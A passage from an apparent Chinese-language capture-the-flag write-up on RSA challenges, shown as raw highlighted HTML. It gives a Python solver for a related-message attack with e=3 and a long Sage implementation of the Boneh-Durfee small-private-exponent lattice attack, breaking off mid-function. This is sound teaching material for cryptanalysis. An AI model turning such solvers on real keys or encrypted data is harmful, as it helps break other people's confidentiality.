operator">=</span>0xa864c9ffa08edc2d2a380fde218fe07204193c43580ee0a3fd1505e3f60125c3f380fab24bbd344bca174f3b5b09ed271b817cb08fa6087f2b9d2216a1c7782714c50f475b0e3ca8b530ae33f4f4fb72c14ac0331b107d9dfcbbb193ac6946edd01e9cf5cab799a444dd9a49eb5362f6a499fa69540ac1d3dfbb977f57cd8eL</code></pre><p>通过化简得到 <code>计算公式： (m+1)^3 - m^3 = c2-c1 ==&gt; (3m^2+3m+1)加减k*n=c2-c1</code></p><p>一元二次方程求根：</p><p><img src="https://raw.githubusercontent.com/Yof3ng/images/master/img/20190529105312.png" alt=""></p><p>此时只需求符合条件的k值即可。</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> gmpy2<span class="token comment" spellcheck="true"># 求一元二次方程根</span>n<span class="token operator">=</span>0x198f61bc7d2977139120b86b739afbd04e82726a7dcf514cc2ad46c7002d2202915ba932364d71b7dd1928fb6861f984d8d9e31e70d0023aca721130e1df2825568a623c8316fd555616d91897a2db5d1df973a1584ed4cfb0f55d910db5ff64a79f061ef71b2362b6c2af8416a5a47094aff428d6c541448df45436ec48f93Lc1<span class="token operator">=</span>0x13a5213f8946b3da1b37a7346f7985ed17329b05c31cc72912e15ab62c2b578f95148f7f2fb3daed063f5517efd9694d8a87792b675715d50d9113baa0bbfb1791f8e551ce5583c3dc31adf37dced9dab4acf3e58a5f3e203b1c971a746de5e9ac0b4d0153538f9392a0ce12250c5597eb23f07b4d7c84a084fc1dd0dee6b1cLc2<span class="token operator">=</span>0xa864c9ffa08edc2d2a380fde218fe07204193c43580ee0a3fd1505e3f60125c3f380fab24bbd344bca174f3b5b09ed271b817cb08fa6087f2b9d2216a1c7782714c50f475b0e3ca8b530ae33f4f4fb72c14ac0331b107d9dfcbbb193ac6946edd01e9cf5cab799a444dd9a49eb5362f6a499fa69540ac1d3dfbb977f57cd8eLe<span class="token operator">=</span><span class="token number">3</span>m <span class="token operator">=</span> <span class="token string">''</span><span class="token comment" spellcheck="true"># 3m^2+3m+1=c2-c1</span><span class="token comment" spellcheck="true"># ▲ = 9-4*3*(1-c2+c1)</span><span class="token comment" spellcheck="true"># x = (-b[+-](▲)^0.5)/(2*a)==>可以知道x为m，即为整数</span><span class="token comment" spellcheck="true"># c = 1-c2+c1-(k*n)</span>k <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    c<span class="token operator">=</span><span class="token number">1</span><span class="token operator">-</span>n<span class="token operator">*</span>k<span class="token operator">+</span><span class="token punctuation">(</span>c1<span class="token operator">-</span>c2<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#print(c)</span>    delta <span class="token operator">=</span> <span class="token number">9</span><span class="token operator">-</span><span class="token number">4</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">*</span>c    <span class="token comment" spellcheck="true">#print(delta)</span>    <span class="token keyword">if</span> delta<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true">#print(iroot(delta,2)[1])</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>iroot<span class="token punctuation">(</span>delta<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>iroot<span class="token punctuation">(</span><span class="token number">9</span><span class="token operator">-</span><span class="token number">12</span><span class="token operator">*</span>c<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">6</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    m<span class="token operator">=</span><span class="token punctuation">(</span>iroot<span class="token punctuation">(</span><span class="token number">9</span><span class="token operator">-</span><span class="token number">12</span><span class="token operator">*</span>c<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">6</span> <span class="token comment" spellcheck="true">#求根</span>                    <span class="token keyword">if</span> pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">==</span>c1<span class="token punctuation">:</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>hex<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">)</span>                        <span class="token keyword">print</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token comment" spellcheck="true">#i = 17时符合条件</span>                        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>    k <span class="token operator">+=</span> <span class="token number">1</span></code></pre><h2 id="❎Challenge-6"><a href="#❎Challenge-6" class="headerlink" title="❎Challenge 6"></a>❎Challenge 6</h2><p>Boneh and Durfee attack.（当d的bits数小于n的一定程度时，可采用此攻击。题中出现了<code>d=random.getrandbits(1024*0.270)</code>）</p><pre class=" language-python"><code class="language-python"><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>Generating challenge <span class="token number">6</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>n<span class="token operator">=</span>0xbadd260d14ea665b62e7d2e634f20a6382ac369cd44017305b69cf3a2694667ee651acded7085e0757d169b090f29f3f86fec255746674ffa8a6a3e1c9e1861003eb39f82cf74d84cc18e345f60865f998b33fc182a1a4ffa71f5ae48a1b5cb4c5f154b0997dc9b001e441815ce59c6c825f064fdca678858758dc2cebbc4d27L<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>d<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">1024</span><span class="token operator">*</span><span class="token number">0.270</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>e<span class="token operator">=</span>invmod<span class="token punctuation">(</span>d<span class="token punctuation">,</span>phin<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>hex<span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token operator">=</span>0x11722b54dd6f3ad9ce81da6f6ecb0acaf2cbc3885841d08b32abc0672d1a7293f9856db8f9407dc05f6f373a2d9246752a7cc7b1b6923f1827adfaeefc811e6e5989cce9f00897cfc1fc57987cce4862b5343bc8e91ddf2bd9e23aea9316a69f28f407cfe324d546a7dde13eb0bd052f694aefe8ec0f5298800277dbab4a33bbL<span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>m<span class="token operator">=</span>random<span class="token punctuation">.</span>getrandbits<span class="token punctuation">(</span><span class="token number">512</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">+</span><span class="token punctuation">]</span>c<span class="token operator">=</span>pow<span class="token punctuation">(</span>m<span class="token punctuation">,</span>e<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token operator">=</span>0xe3505f41ec936cf6bd8ae344bfec85746dc7d87a5943b3a7136482dd7b980f68f52c887585d1c7ca099310c4da2f70d4d5345d3641428797030177da6cc0d41e7b28d0abce694157c611697df8d0add3d900c00f778ac3428f341f47ecc4d868c6c5de0724b0c3403296d84f26736aa66f7905d498fa1862ca59e97f8f866cL<span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span>long_to_bytes<span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token operator">=</span></code></pre><p>code:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> time<span class="token comment" spellcheck="true">############################################</span><span class="token comment" spellcheck="true"># Config</span><span class="token comment" spellcheck="true">##########################################</span><span class="token triple-quoted-string string">"""Setting debug to true will display more informationsabout the lattice, the bounds, the vectors..."""</span>debug <span class="token operator">=</span> <span class="token boolean">True</span><span class="token triple-quoted-string string">"""Setting strict to true will stop the algorithm (andreturn (-1, -1)) if we don't have a correct upperbound on the determinant. Note that this doesn't necesseraly mean that no solutions will be found since the theoretical upperbound isusualy far away from actual results. That is whyyou should probably use `strict = False`"""</span>strict <span class="token operator">=</span> <span class="token boolean">False</span><span class="token triple-quoted-string string">"""This is experimental, but has provided remarkable resultsso far. It tries to reduce the lattice as much as it canwhile keeping its efficiency. I see no reason not to usethis option, but if things don't work, you should trydisabling it"""</span>helpful_only <span class="token operator">=</span> <span class="token boolean">True</span>dimension_min <span class="token operator">=</span> <span class="token number">7</span> <span class="token comment" spellcheck="true"># stop removing if lattice reaches that dimension</span><span class="token comment" spellcheck="true">############################################</span><span class="token comment" spellcheck="true"># Functions</span><span class="token comment" spellcheck="true">##########################################</span><span class="token comment" spellcheck="true"># display stats on helpful vectors</span><span class="token keyword">def</span> <span class="token function">helpful_vectors</span><span class="token punctuation">(</span>BB<span class="token punctuation">,</span> modulus<span class="token punctuation">)</span><span class="token punctuation">:</span>    nothelpful <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> range<span class="token punctuation">(</span>BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span>ii<span class="token punctuation">]</span> <span class="token operator">>=</span> modulus<span class="token punctuation">:</span>            nothelpful <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token keyword">print</span> nothelpful<span class="token punctuation">,</span> <span class="token string">"/"</span><span class="token punctuation">,</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">" vectors are not helpful"</span><span class="token comment" spellcheck="true"># display matrix picture with 0 and X</span><span class="token keyword">def</span> <span class="token function">matrix_overview</span><span class="token punctuation">(</span>BB<span class="token punctuation">,</span> bound<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> range<span class="token punctuation">(</span>BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        a <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%02d '</span> <span class="token operator">%</span> ii<span class="token punctuation">)</span>        <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span>BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            a <span class="token operator">+=</span> <span class="token string">'0'</span> <span class="token keyword">if</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span>jj<span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token keyword">else</span> <span class="token string">'X'</span>            <span class="token keyword">if</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> <span class="token number">60</span><span class="token punctuation">:</span>                a <span class="token operator">+=</span> <span class="token string">' '</span>        <span class="token keyword">if</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> ii<span class="token punctuation">]</span> <span class="token operator">>=</span> bound<span class="token punctuation">:</span>            a <span class="token operator">+=</span> <span class="token string">'~'</span>        <span class="token keyword">print</span> a<span class="token comment" spellcheck="true"># tries to remove unhelpful vectors</span><span class="token comment" spellcheck="true"># we start at current = n-1 (last vector)</span><span class="token keyword">def</span> <span class="token function">remove_unhelpful</span><span class="token punctuation">(</span>BB<span class="token punctuation">,</span> monomials<span class="token punctuation">,</span> bound<span class="token punctuation">,</span> current<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment" spellcheck="true"># end of our recursive function</span>    <span class="token keyword">if</span> current <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span> <span class="token operator">or</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&lt;=</span> dimension_min<span class="token punctuation">:</span>        <span class="token keyword">return</span> BB    <span class="token comment" spellcheck="true"># we start by checking from the end</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> range<span class="token punctuation">(</span>current<span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># if it is unhelpful:</span>        <span class="token keyword">if</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> ii<span class="token punctuation">]</span> <span class="token operator">>=</span> bound<span class="token punctuation">:</span>            affected_vectors <span class="token operator">=</span> <span class="token number">0</span>            affected_vector_index <span class="token operator">=</span> <span class="token number">0</span>            <span class="token comment" spellcheck="true"># let's check if it affects other vectors</span>            <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span>ii <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token comment" spellcheck="true"># if another vector is affected:</span>                <span class="token comment" spellcheck="true"># we increase the count</span>                <span class="token keyword">if</span> BB<span class="token punctuation">[</span>jj<span class="token punctuation">,</span> ii<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>                    affected_vectors <span class="token operator">+=</span> <span class="token number">1</span>                    affected_vector_index <span class="token operator">=</span> jj            <span class="token comment" spellcheck="true"># level:0</span>            <span class="token comment" spellcheck="true"># if no other vectors end up affected</span>            <span class="token comment" spellcheck="true"># we remove it</span>            <span class="token keyword">if</span> affected_vectors <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>                <span class="token keyword">print</span> <span class="token string">"* removing unhelpful vector"</span><span class="token punctuation">,</span> ii                BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>delete_columns<span class="token punctuation">(</span><span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">)</span>                BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>delete_rows<span class="token punctuation">(</span><span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">)</span>                monomials<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>ii<span class="token punctuation">)</span>                BB <span class="token operator">=</span> remove_unhelpful<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> monomials<span class="token punctuation">,</span> bound<span class="token punctuation">,</span> ii<span class="token number">-1</span><span class="token punctuation">)</span>                <span class="token keyword">return</span> BB            <span class="token comment" spellcheck="true"># level:1</span>            <span class="token comment" spellcheck="true"># if just one was affected we check</span>            <span class="token comment" spellcheck="true"># if it is affecting someone else</span>            <span class="token keyword">elif</span> affected_vectors <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>                affected_deeper <span class="token operator">=</span> <span class="token boolean">True</span>                <span class="token keyword">for</span> kk <span class="token keyword">in</span> range<span class="token punctuation">(</span>affected_vector_index <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token comment" spellcheck="true"># if it is affecting even one vector</span>                    <span class="token comment" spellcheck="true"># we give up on this one</span>                    <span class="token keyword">if</span> BB<span class="token punctuation">[</span>kk<span class="token punctuation">,</span> affected_vector_index<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">:</span>                        affected_deeper <span class="token operator">=</span> <span class="token boolean">False</span>                <span class="token comment" spellcheck="true"># remove both it if no other vector was affected and</span>                <span class="token comment" spellcheck="true"># this helpful vector is not helpful enough</span>                <span class="token comment" spellcheck="true"># compared to our unhelpful one</span>                <span class="token keyword">if</span> affected_deeper <span class="token operator">and</span> abs<span class="token punctuation">(</span>bound <span class="token operator">-</span> BB<span class="token punctuation">[</span>affected_vector_index<span class="token punctuation">,</span> affected_vector_index<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> abs<span class="token punctuation">(</span>bound <span class="token operator">-</span> BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> ii<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span> <span class="token string">"* removing unhelpful vectors"</span><span class="token punctuation">,</span> ii<span class="token punctuation">,</span> <span class="token string">"and"</span><span class="token punctuation">,</span> affected_vector_index                    BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>delete_columns<span class="token punctuation">(</span><span class="token punctuation">[</span>affected_vector_index<span class="token punctuation">,</span> ii<span class="token punctuation">]</span><span class="token punctuation">)</span>                    BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>delete_rows<span class="token punctuation">(</span><span class="token punctuation">[</span>affected_vector_index<span class="token punctuation">,</span> ii<span class="token punctuation">]</span><span class="token punctuation">)</span>                    monomials<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>affected_vector_index<span class="token punctuation">)</span>                    monomials<span class="token punctuation">.</span>pop<span class="token punctuation">(</span>ii<span class="token punctuation">)</span>                    BB <span class="token operator">=</span> remove_unhelpful<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> monomials<span class="token punctuation">,</span> bound<span class="token punctuation">,</span> ii<span class="token number">-1</span><span class="token punctuation">)</span>                    <span class="token keyword">return</span> BB    <span class="token comment" spellcheck="true"># nothing happened</span>    <span class="token keyword">return</span> BB<span class="token triple-quoted-string string">""" Returns:* 0,0   if it fails* -1,-1 if `strict=true`, and determinant doesn't bound* x0,y0 the solutions of `pol`"""</span><span class="token keyword">def</span> <span class="token function">boneh_durfee</span><span class="token punctuation">(</span>pol<span class="token punctuation">,</span> modulus<span class="token punctuation">,</span> mm<span class="token punctuation">,</span> tt<span class="token punctuation">,</span> XX<span class="token punctuation">,</span> YY<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    Boneh and Durfee revisited by Herrmann and May    finds a solution if:    * d &lt; N^delta    * |x| &lt; e^delta    * |y| &lt; e^0.5    whenever delta &lt; 1 - sqrt(2)/2 ~ 0.292    """</span>    <span class="token comment" spellcheck="true"># substitution (Herrman and May)</span>    PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>u<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token operator">></span> <span class="token operator">=</span> PolynomialRing<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span>    Q <span class="token operator">=</span> PR<span class="token punctuation">.</span>quotient<span class="token punctuation">(</span>x<span class="token operator">*</span>y <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">-</span> u<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># u = xy + 1</span>    polZ <span class="token operator">=</span> Q<span class="token punctuation">(</span>pol<span class="token punctuation">)</span><span class="token punctuation">.</span>lift<span class="token punctuation">(</span><span class="token punctuation">)</span>    UU <span class="token operator">=</span> XX<span class="token operator">*</span>YY <span class="token operator">+</span> <span class="token number">1</span>    <span class="token comment" spellcheck="true"># x-shifts</span>    gg <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> kk <span class="token keyword">in</span> range<span class="token punctuation">(</span>mm <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> ii <span class="token keyword">in</span> range<span class="token punctuation">(</span>mm <span class="token operator">-</span> kk <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            xshift <span class="token operator">=</span> x<span class="token operator">^</span>ii <span class="token operator">*</span> modulus<span class="token operator">^</span><span class="token punctuation">(</span>mm <span class="token operator">-</span> kk<span class="token punctuation">)</span> <span class="token operator">*</span> polZ<span class="token punctuation">(</span>u<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token operator">^</span>kk            gg<span class="token punctuation">.</span>append<span class="token punctuation">(</span>xshift<span class="token punctuation">)</span>    gg<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># x-shifts list of monomials</span>    monomials <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> polynomial <span class="token keyword">in</span> gg<span class="token punctuation">:</span>        <span class="token keyword">for</span> monomial <span class="token keyword">in</span> polynomial<span class="token punctuation">.</span>monomials<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> monomial <span class="token operator">not</span> <span class="token keyword">in</span> monomials<span class="token punctuation">:</span>                monomials<span class="token punctuation">.</span>append<span class="token punctuation">(</span>monomial<span class="token punctuation">)</span>    monomials<span class="token punctuation">.</span>sort<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># y-shifts (selected by Herrman and May)</span>    <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> tt <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> kk <span class="token keyword">in</span> range<span class="token punctuation">(</span>floor<span class="token punctuation">(</span>mm<span class="token operator">/</span>tt<span class="token punctuation">)</span> <span class="token operator">*</span> jj<span class="token punctuation">,</span> mm <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            yshift <span class="token operator">=</span> y<span class="token operator">^</span>jj <span class="token operator">*</span> polZ<span class="token punctuation">(</span>u<span class="token punctuation">,</span> x<span class="token punctuation">,</span> y<span class="token punctuation">)</span><span class="token operator">^</span>kk <span class="token operator">*</span> modulus<span class="token operator">^</span><span class="token punctuation">(</span>mm <span class="token operator">-</span> kk<span class="token punctuation">)</span>            yshift <span class="token operator">=</span> Q<span class="token punctuation">(</span>yshift<span class="token punctuation">)</span><span class="token punctuation">.</span>lift<span class="token punctuation">(</span><span class="token punctuation">)</span>            gg<span class="token punctuation">.</span>append<span class="token punctuation">(</span>yshift<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># substitution</span>    <span class="token comment" spellcheck="true"># y-shifts list of monomials</span>    <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> tt <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> kk <span class="token keyword">in</span> range<span class="token punctuation">(</span>floor<span class="token punctuation">(</span>mm<span class="token operator">/</span>tt<span class="token punctuation">)</span> <span class="token operator">*</span> jj<span class="token punctuation">,</span> mm <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            monomials<span class="token punctuation">.</span>append<span class="token punctuation">(</span>u<span class="token operator">^</span>kk <span class="token operator">*</span> y<span class="token operator">^</span>jj<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># construct lattice B</span>    nn <span class="token operator">=</span> len<span class="token punctuation">(</span>monomials<span class="token punctuation">)</span>    BB <span class="token operator">=</span> Matrix<span class="token punctuation">(</span>ZZ<span class="token punctuation">,</span> nn<span class="token punctuation">)</span>    <span class="token keyword">for</span> ii <span class="token keyword">in</span> range<span class="token punctuation">(</span>nn<span class="token punctuation">)</span><span class="token punctuation">:</span>        BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> gg<span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token keyword">for</span> jj <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> ii <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span> <span class="token keyword">in</span> gg<span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">.</span>monomials<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                BB<span class="token punctuation">[</span>ii<span class="token punctuation">,</span> jj<span class="token punctuation">]</span> <span class="token operator">=</span> gg<span class="token punctuation">[</span>ii<span class="token punctuation">]</span><span class="token punctuation">.</span>monomial_coefficient<span class="token punctuation">(</span>monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> monomials<span class="token punctuation">[</span>jj<span class="token punctuation">]</span><span class="token punctuation">(</span>UU<span class="token punctuation">,</span>XX<span class="token punctuation">,</span>YY<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># Prototype to reduce the lattice</span>    <span class="token keyword">if</span> helpful_only<span class="token punctuation">:</span>        <span class="token comment" spellcheck="true"># automatically remove</span>        BB <span class="token operator">=</span> remove_unhelpful<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> monomials<span class="token punctuation">,</span> modulus<span class="token operator">^</span>mm<span class="token punctuation">,</span> nn<span class="token number">-1</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># reset dimension</span>        nn <span class="token operator">=</span> BB<span class="token punctuation">.</span>dimensions<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> nn <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token string">"failure"</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span>    <span class="token comment" spellcheck="true"># check if vectors are helpful</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        helpful_vectors<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> modulus<span class="token operator">^</span>mm<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># check if determinant is correctly bounded</span>    det <span class="token operator">=</span> BB<span class="token punctuation">.</span>det<span class="token punctuation">(</span><span class="token punctuation">)</span>    bound <span class="token operator">=</span> modulus<span class="token operator">^</span><span class="token punctuation">(</span>mm<span class="token operator">*</span>nn<span class="token punctuation">)</span>    <span class="token keyword">if</span> det <span class="token operator">>=</span> bound<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"We do not have det &lt; bound. Solutions might not be found."</span>        <span class="token keyword">print</span> <span class="token string">"Try with highers m and t."</span>        <span class="token keyword">if</span> debug<span class="token punctuation">:</span>            diff <span class="token operator">=</span> <span class="token punctuation">(</span>log<span class="token punctuation">(</span>det<span class="token punctuation">)</span> <span class="token operator">-</span> log<span class="token punctuation">(</span>bound<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">/</span> log<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>            <span class="token keyword">print</span> <span class="token string">"size det(L) - size e^(m*n) = "</span><span class="token punctuation">,</span> floor<span class="token punctuation">(</span>diff<span class="token punctuation">)</span>        <span class="token keyword">if</span> strict<span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)"</span>    <span class="token comment" spellcheck="true"># display the lattice basis</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        matrix_overview<span class="token punctuation">(</span>BB<span class="token punctuation">,</span> modulus<span class="token operator">^</span>mm<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true"># LLL</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"optimizing basis of the lattice via LLL, this can take a long time"</span>    BB <span class="token operator">=</span> BB<span class="token punctuation">.</span>LLL<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"LLL is done!"</span>    <span class="token comment" spellcheck="true"># transform vector i &amp; j -> polynomials 1 &amp; 2</span>    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>        <span class="token keyword">print</span> <span class="token string">"looking for independent vectors in the lattice"</span>    found_polynomials <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">for</span> pol1_idx <span 